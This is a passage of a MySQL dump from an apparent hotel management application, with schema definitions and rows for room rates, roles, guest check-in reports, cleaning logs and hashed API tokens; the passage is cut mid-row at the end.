  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `menu_categories` WRITE;
/*!40000 ALTER TABLE `menu_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `menu_categories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `menus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `menus` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `menu_category_id` bigint unsigned NOT NULL,
  `item_code` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `menus` WRITE;
/*!40000 ALTER TABLE `menus` DISABLE KEYS */;
/*!40000 ALTER TABLE `menus` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `migrations` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=65 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2014_10_12_000000_create_users_table',1),(2,'2014_10_12_100000_create_password_resets_table',1),(3,'2014_10_12_200000_add_two_factor_columns_to_users_table',1),(4,'2019_08_19_000000_create_failed_jobs_table',1),(5,'2019_12_14_000001_create_personal_access_tokens_table',1),(6,'2023_01_09_003353_create_sessions_table',1),(7,'2023_01_09_011352_create_permission_tables',1),(8,'2023_01_09_013909_create_branches_table',1),(9,'2023_01_09_044158_create_types_table',1),(10,'2023_01_09_062131_create_staying_hours_table',1),(11,'2023_01_09_062147_create_rates_table',1),(12,'2023_01_10_013013_create_floors_table',1),(13,'2023_01_10_053310_create_rooms_table',1),(14,'2023_01_11_054703_create_discounts_table',1),(15,'2023_01_11_072554_create_extension_rates_table',1),(16,'2023_01_11_082241_create_hotel_items_table',1),(17,'2023_01_11_112128_create_requestable_items_table',1),(18,'2023_01_13_015319_create_guests_table',1),(19,'2023_01_13_015911_create_temporary_check_in_kiosks_table',1),(20,'2023_01_13_110452_create_jobs_table',1),(21,'2023_01_13_133418_create_transactions_table',1),(22,'2023_01_13_133436_create_checkin_details_table',1),(23,'2023_01_17_110924_create_transaction_types_table',1),(24,'2023_01_24_111333_create_cleaning_histories_table',1),(25,'2023_01_24_170546_create_menu_categories_table',1),(26,'2023_01_24_184549_create_menus_table',1),(27,'2023_01_24_184821_create_inventories_table',1),(28,'2023_01_31_110026_create_frontdesks_table',1),(29,'2023_01_31_114024_create_assigned_frontdesks_table',1),(30,'2023_02_06_205903_create_expense_categories_table',1),(31,'2023_02_07_081720_create_expenses_table',1),(32,'2023_02_08_204445_create_shift_logs_table',1),(33,'2023_02_09_101803_create_stay_extensions_table',1),(34,'2023_02_28_110640_create_new_guest_reports_table',1),(35,'2023_02_28_143009_create_check_out_guest_reports_table',1),(36,'2023_03_01_115621_create_room_boy_reports_table',1),(37,'2023_03_02_135506_create_unoccupied_room_reports_table',1),(38,'2023_03_02_144943_create_extended_guest_reports_table',1),(39,'2023_03_09_214821_create_temporary_reserveds_table',1),(40,'2024_05_06_083859_create_frontdesk_categories_table',1),(41,'2024_05_06_084015_create_frontdesk_menus_table',1),(42,'2024_05_06_084026_create_frontdesk_inventories_table',1),(43,'2024_05_06_170704_create_pub_categories_table',1),(44,'2024_05_06_170716_create_pub_menus_table',1),(45,'2024_05_06_170724_create_pub_inventories_table',1),(46,'2024_05_20_150902_add_column_previous_room_id_on_guests_table',1),(47,'2025_06_05_092953_change_data_type_on_rooms_table',1),(48,'2025_06_16_090707_add_column_initial_deposit_to_branch_table',1),(49,'2025_06_18_102414_add_column_deposit_enabled_to_branches_table',1),(50,'2025_06_18_140238_add_column_has_discount_to_guests_table',1),(51,'2025_06_24_102431_add_column_has_discount_to_rates_table',1),(52,'2025_07_01_104113_add_column_has_kiosk_check_out_to_guests_table',1),(53,'2025_07_21_111252_add_column_user_id_to_expenses_table',1),(54,'2025_08_07_135126_add_column_image_on_frontdesk_menus',1),(55,'2025_08_08_142506_add_column_branch_id_to_room_boy_reports',1),(56,'2025_08_12_135730_create_floor_user_table',1),(57,'2025_08_28_161029_create_transfer_reasons_table',1),(58,'2025_08_29_083259_add_column_is_active_to_users_table',1),(59,'2025_09_11_161912_create_activity_logs_table',1),(60,'2025_09_24_145204_add_column_frontdesk_id_to_checkin_details_table',1),(61,'2025_10_10_081926_add_column_item_code_to_menus_table',1),(62,'2025_10_10_083455_add_column_item_code_to_frontdesk_menus_table',1),(63,'2025_11_18_141733_add_column_is_co_to_transactions_table',2),(64,'2025_11_19_102546_add_column_is_co_to_guests_table',2);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `model_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `model_has_permissions` (
  `permission_id` bigint unsigned NOT NULL,
  `model_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`),
  CONSTRAINT `model_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `model_has_permissions` WRITE;
/*!40000 ALTER TABLE `model_has_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `model_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `model_has_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `model_has_roles` (
  `role_id` bigint unsigned NOT NULL,
  `model_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint unsigned NOT NULL,
  PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`),
  CONSTRAINT `model_has_roles_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `model_has_roles` WRITE;
/*!40000 ALTER TABLE `model_has_roles` DISABLE KEYS */;
INSERT INTO `model_has_roles` VALUES (1,'App\\Models\\User',1),(2,'App\\Models\\User',2),(3,'App\\Models\\User',3),(6,'App\\Models\\User',4),(5,'App\\Models\\User',5),(7,'App\\Models\\User',6),(4,'App\\Models\\User',7),(8,'App\\Models\\User',8),(3,'App\\Models\\User',9),(3,'App\\Models\\User',10);
/*!40000 ALTER TABLE `model_has_roles` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `new_guest_reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `new_guest_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `checkin_details_id` bigint unsigned NOT NULL,
  `shift_date` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `frontdesk_id` int NOT NULL,
  `partner_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `new_guest_reports` WRITE;
/*!40000 ALTER TABLE `new_guest_reports` DISABLE KEYS */;
INSERT INTO `new_guest_reports` VALUES (1,1,17,1,'November 18, 2025','AM',1,'Tan','2025-11-18 15:02:45','2025-11-18 15:02:45'),(2,1,23,2,'November 18, 2025','AM',1,'Tan','2025-11-18 15:02:56','2025-11-18 15:02:56'),(3,1,3,3,'November 18, 2025','AM',1,'Tan','2025-11-18 15:03:12','2025-11-18 15:03:12'),(4,1,6,4,'November 18, 2025','AM',1,'Tan','2025-11-18 15:03:40','2025-11-18 15:03:40'),(5,1,207,5,'November 18, 2025','AM',1,'Tan','2025-11-18 15:05:07','2025-11-18 15:05:07'),(6,1,208,6,'November 18, 2025','AM',1,'Tan','2025-11-18 15:05:29','2025-11-18 15:05:29'),(7,1,209,7,'November 18, 2025','AM',1,'Tan','2025-11-18 15:05:38','2025-11-18 15:05:38'),(8,1,127,8,'November 18, 2025','AM',1,'Tan','2025-11-18 15:05:46','2025-11-18 15:05:46'),(9,1,128,9,'November 18, 2025','AM',1,'Tan','2025-11-18 15:05:58','2025-11-18 15:05:58'),(10,1,210,10,'November 18, 2025','AM',1,'Tan','2025-11-18 15:06:24','2025-11-18 15:06:24'),(11,1,3,11,'November 18, 2025','AM',1,'Tan','2025-11-19 09:42:32','2025-11-19 09:42:32'),(12,1,209,12,'November 19, 2025','AM',2,'sirok','2025-11-19 15:07:03','2025-11-19 15:07:03'),(13,1,6,13,'November 18, 2025','AM',1,'Tan','2025-11-19 15:38:37','2025-11-19 15:38:37'),(14,1,17,14,'November 18, 2025','AM',1,'Tan','2025-11-20 09:49:06','2025-11-20 09:49:06'),(15,1,23,15,'November 18, 2025','AM',1,'Tan','2025-11-20 10:17:22','2025-11-20 10:17:22'),(16,1,207,16,'November 18, 2025','AM',1,'Tan','2025-11-20 10:17:39','2025-11-20 10:17:39'),(17,1,209,17,'November 18, 2025','AM',1,'Tan','2025-11-20 10:55:17','2025-11-20 10:55:17'),(18,1,3,18,'November 18, 2025','AM',1,'Tan','2025-11-20 10:55:52','2025-11-20 10:55:52'),(19,1,17,19,'November 18, 2025','AM',1,'Tan','2025-11-20 11:10:24','2025-11-20 11:10:24'),(20,1,6,20,'November 18, 2025','AM',1,'Tan','2025-11-20 11:10:53','2025-11-20 11:10:53'),(21,1,127,21,'November 18, 2025','AM',1,'Tan','2025-11-20 11:11:19','2025-11-20 11:11:19'),(22,1,172,22,'November 18, 2025','AM',1,'Tan','2025-11-20 13:19:32','2025-11-20 13:19:32'),(23,1,23,23,'November 18, 2025','AM',1,'Tan','2025-11-20 14:10:58','2025-11-20 14:10:58'),(24,1,1,24,'November 18, 2025','AM',1,'Tan','2025-11-20 14:11:29','2025-11-20 14:11:29'),(25,1,48,25,'November 18, 2025','AM',1,'Tan','2025-11-20 16:09:44','2025-11-20 16:09:44'),(26,1,207,26,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:33:42','2025-11-21 20:33:42'),(27,1,208,27,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:49:09','2025-11-21 20:49:09'),(28,1,209,28,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:53:54','2025-11-21 20:53:54'),(29,1,127,29,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:57:02','2025-11-21 20:57:02'),(30,1,128,30,'November 21, 2025','PM',2,'Bhong','2025-11-21 20:59:50','2025-11-21 20:59:50'),(31,1,210,31,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:04:31','2025-11-21 21:04:31'),(32,1,211,32,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:19:28','2025-11-21 21:19:28'),(33,1,212,33,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:28:29','2025-11-21 21:28:29'),(34,1,35,34,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:30:17','2025-11-21 21:30:17'),(35,1,213,35,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:33:14','2025-11-21 21:33:14'),(36,1,214,36,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:36:25','2025-11-21 21:36:25'),(37,1,45,37,'November 21, 2025','PM',2,'Bhong','2025-11-21 21:40:03','2025-11-21 21:40:03');
/*!40000 ALTER TABLE `new_guest_reports` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `permissions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `permissions_name_guard_name_unique` (`name`,`guard_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `permissions` WRITE;
/*!40000 ALTER TABLE `permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `permissions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
INSERT INTO `personal_access_tokens` VALUES (1,'App\\Models\\User',4,'mobile-token','aebf21b0d75665adefd38512a30516caedb85a24961cfcb20242fa8c27bda6b8','[\"*\"]',NULL,NULL,'2025-11-18 14:37:01','2025-11-18 14:37:01'),(2,'App\\Models\\User',4,'mobile-token','548c54640b984e6e5f4f192a1fc20ab3e332bcf2ffb0585c22bdb5f1c67001d3','[\"*\"]','2025-11-19 15:06:41',NULL,'2025-11-18 14:42:12','2025-11-19 15:06:41'),(3,'App\\Models\\User',4,'mobile-token','ee05f3d4967f5544984490c4cdba21d3af372a8267a15218ed49991c6e92d788','[\"*\"]','2025-11-20 10:16:55',NULL,'2025-11-19 15:37:44','2025-11-20 10:16:55'),(4,'App\\Models\\User',4,'mobile-token','ec968cf0dcc2d4ef214c5323c7afc20fa27f458dd2d213a16bb2160d2b3c6a3e','[\"*\"]','2025-11-20 11:10:15',NULL,'2025-11-20 10:40:43','2025-11-20 11:10:15'),(5,'App\\Models\\User',4,'mobile-token','40fa5a97e52f514d5f4232cf82b8aa53957d6a5ce8e94ba85f2a4e9907634085','[\"*\"]','2025-11-20 13:24:23',NULL,'2025-11-20 13:08:39','2025-11-20 13:24:23'),(6,'App\\Models\\User',4,'mobile-token','d8c72502dfff6aad7a67febd12f91fb1674cd3be7f8f9467f4202125408bef1c','[\"*\"]',NULL,NULL,'2025-11-20 15:48:13','2025-11-20 15:48:13'),(7,'App\\Models\\User',4,'mobile-token','8ec192c4dbab3d5208a8fa1063e44de205bef1c5f0c043d3d3fc98498d9494d0','[\"*\"]','2025-11-20 16:09:28',NULL,'2025-11-20 15:49:58','2025-11-20 16:09:28'),(8,'App\\Models\\User',4,'mobile-token','5af983c9c1a7f3a2286b17759d89b5938884d488713927ab67447ec17a6df849','[\"*\"]',NULL,NULL,'2025-11-21 20:13:29','2025-11-21 20:13:29'),(9,'App\\Models\\User',4,'mobile-token','e284487adcd7d12407e37c60742aa47829b24009da92ef04051463869df32dc2','[\"*\"]','2025-11-21 21:04:14',NULL,'2025-11-21 20:24:05','2025-11-21 21:04:14'),(10,'App\\Models\\User',4,'mobile-token','2b40b48b89ff0cf85427a54bdbcc61c430aa977793a7fc1b7f897ce8feaebdd8','[\"*\"]','2025-11-21 21:39:47',NULL,'2025-11-21 21:14:44','2025-11-21 21:39:47');
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `pub_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `pub_categories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `pub_categories` WRITE;
/*!40000 ALTER TABLE `pub_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `pub_categories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `pub_inventories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `pub_inventories` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `pub_menu_id` bigint unsigned NOT NULL,
  `number_of_serving` double NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `pub_inventories` WRITE;
/*!40000 ALTER TABLE `pub_inventories` DISABLE KEYS */;
/*!40000 ALTER TABLE `pub_inventories` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `pub_menus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `pub_menus` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `pub_category_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `pub_menus` WRITE;
/*!40000 ALTER TABLE `pub_menus` DISABLE KEYS */;
/*!40000 ALTER TABLE `pub_menus` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `rates`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `rates` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `staying_hour_id` bigint unsigned NOT NULL,
  `type_id` bigint unsigned NOT NULL,
  `amount` int NOT NULL,
  `is_available` tinyint(1) NOT NULL DEFAULT '1',
  `has_discount` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `rates` WRITE;
/*!40000 ALTER TABLE `rates` DISABLE KEYS */;
INSERT INTO `rates` VALUES (1,1,1,1,224,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(2,1,2,1,336,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(3,1,4,1,560,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(4,1,1,2,280,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(5,1,2,2,392,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(6,1,4,2,616,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(7,1,1,3,336,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(8,1,2,3,448,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(9,1,4,3,672,1,0,'2025-11-18 14:23:01','2025-11-18 14:23:01');
/*!40000 ALTER TABLE `rates` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `requestable_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `requestable_items` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `requestable_items` WRITE;
/*!40000 ALTER TABLE `requestable_items` DISABLE KEYS */;
INSERT INTO `requestable_items` VALUES (1,1,'EXTRA PERSON WITH FREE PILLOW, BLANKET,TOWEL',100,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(2,1,'EXTRA PILLOW',20,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(3,1,'EXTRA TOWEL',20,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(4,1,'EXTRA BLANKET',20,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(5,1,'EXTRA FITTED SHEET',20,'2025-11-18 14:23:01','2025-11-18 14:23:01');
/*!40000 ALTER TABLE `requestable_items` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `role_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `role_has_permissions` (
  `permission_id` bigint unsigned NOT NULL,
  `role_id` bigint unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`role_id`),
  KEY `role_has_permissions_role_id_foreign` (`role_id`),
  CONSTRAINT `role_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE,
  CONSTRAINT `role_has_permissions_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `role_has_permissions` WRITE;
/*!40000 ALTER TABLE `role_has_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `role_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `roles` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `guard_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `roles_name_guard_name_unique` (`name`,`guard_name`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'superadmin','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(2,'admin','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(3,'frontdesk','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(4,'roomboy','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(5,'kitchen','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(6,'kiosk','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(7,'back_office','web','2025-11-18 14:22:59','2025-11-18 14:22:59'),(8,'pub_kitchen','web','2025-11-18 14:23:01','2025-11-18 14:23:01');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `room_boy_reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `room_boy_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned DEFAULT '1',
  `room_id` bigint unsigned NOT NULL,
  `checkin_details_id` bigint unsigned NOT NULL,
  `roomboy_id` bigint unsigned NOT NULL,
  `cleaning_start` datetime NOT NULL,
  `cleaning_end` datetime NOT NULL,
  `total_hours_spent` int NOT NULL,
  `interval` int NOT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `is_cleaned` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `room_boy_reports` WRITE;
/*!40000 ALTER TABLE `room_boy_reports` DISABLE KEYS */;
INSERT INTO `room_boy_reports` VALUES (1,1,3,3,7,'2025-11-18 15:42:21','2025-11-18 16:04:07',21,0,'AM',1,'2025-11-18 15:42:21','2025-11-18 16:04:07'),(2,1,6,4,7,'2025-11-18 16:04:11','2025-11-18 16:28:08',23,0,'AM',1,'2025-11-18 16:04:11','2025-11-18 16:28:08'),(3,1,17,1,7,'2025-11-19 08:53:18','2025-11-19 09:08:29',15,0,'AM',1,'2025-11-19 08:53:18','2025-11-19 09:08:29'),(4,1,23,2,7,'2025-11-19 09:08:42','2025-11-19 09:24:29',15,0,'AM',1,'2025-11-19 09:08:42','2025-11-19 09:24:29'),(5,1,209,7,7,'2025-11-19 09:24:37','2025-11-19 09:40:21',16,0,'AM',1,'2025-11-19 09:24:37','2025-11-19 09:40:21'),(6,1,127,8,7,'2025-11-19 09:40:56','2025-11-19 09:56:14',16,0,'AM',1,'2025-11-19 09:40:56','2025-11-19 09:56:14'),(7,1,3,11,7,'2025-11-19 09:58:00','2025-11-19 10:13:52',16,1,'AM',1,'2025-11-19 09:58:00','2025-11-19 10:13:52'),(8,1,6,13,7,'2025-11-19 15:39:31','2025-11-19 15:57:04',18,325,'AM',1,'2025-11-19 15:39:31','2025-11-19 15:57:04'),(9,1,207,5,7,'2025-11-20 08:58:13','2025-11-20 09:13:44',16,0,'AM',1,'2025-11-20 08:58:13','2025-11-20 09:13:44'),(10,1,210,10,7,'2025-11-20 